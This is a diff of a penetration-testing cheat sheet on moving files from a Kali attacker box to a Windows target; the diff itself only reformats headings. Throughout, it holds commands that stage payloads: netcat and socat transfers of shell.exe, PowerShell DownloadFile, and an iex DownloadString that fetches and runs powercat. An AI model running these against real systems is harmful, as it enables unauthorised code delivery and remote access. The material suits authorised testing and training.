@@ -2,13 +2,13 @@
 
 ## HTTP Server
 
-### Server
+Server
 
 ``` bash
 sudo python3 -m http.server 80
 ```
 
-### wget
+wget
 
 ``` bash
 wget <uri> -O /path/to/file.ext
@@ -18,7 +18,7 @@ wget <uri> -P /path/to/
 
 ## SMB Protocol
 
-### Install
+Install
 
 ``` bash
 git clone https://github.com/SecureAuthCorp/impacket.git
@@ -27,7 +27,7 @@ sudo pip install -r requirements.txt
 sudo python3 setup.py install
 ```
 
-### SMB Server
+SMB Server
 
 ``` bash
 $ locate whoami.exe
@@ -36,22 +36,22 @@ $ locate whoami.exe
 $ smbserver.py a /usr/share/windows-binaries/
 ```
 
-### SMB Server
+SMB Server
 
 ``` bash
 $ \\<ip_server>\a\whoami.exe
 ```
 
-## FTP Server on Kali Linux
+## FTP Server
 
-### Install
+Install
 
 ``` bash
 sudo apt-get install vsftpd
 sudo service vsftpd start
 ```
 
-### Anonymous access
+Anonymous access
 
 ``` bash
 sudo nano /etc/vsftpd.conf
@@ -61,13 +61,13 @@ sudo nano /etc/vsftpd.conf
 
 ## Netcat
 
-### Kali machine
+Kali machine
 
 ``` bash
 nc -nvlp 4444 < /usr/share/windows-resources/binaries/wget.exe
 ```
 
-### Windows machine
+Windows machine
 
 ``` bash
 nc -nv 192.168.11.130 4444 > wget.exe
@@ -75,13 +75,13 @@ nc -nv 192.168.11.130 4444 > wget.exe
 
 ## Socat
 
-### Kali machine
+Kali machine
 
 ``` bash
 sudo socat TCP4-LISTEN:443,fork file:shell.exe
 ```
 
-### Windows machine
+Windows machine
 
 ``` bash
 socat TCP4:192.168.11.130:443 file:shell.exe,create
@@ -89,13 +89,13 @@ socat TCP4:192.168.11.130:443 file:shell.exe,create
 
 ## PowerShell
 
-### Kali machine
+Kali machine
 
 ``` bash
 sudo python3 -m http.server 80
 ```
 
-### Windows machine
+Windows machine
 
 ``` bash
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.11.130/wget.exe','C:\Users\Public\Desktop\wget.exe')"
@@ -111,13 +111,13 @@ iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 . .\powercat.ps1
 ```
 
-### Kali machine
+Kali machine
 
 ``` bash
 sudo nc -lnvp 443 > powercat.ps1
 ```
 
-### Windows machine
+Windows machine
 
 ``` bash
 powercat -c 192.168.11.130 -p 443 -i C:\Users\Public\powercat.ps1
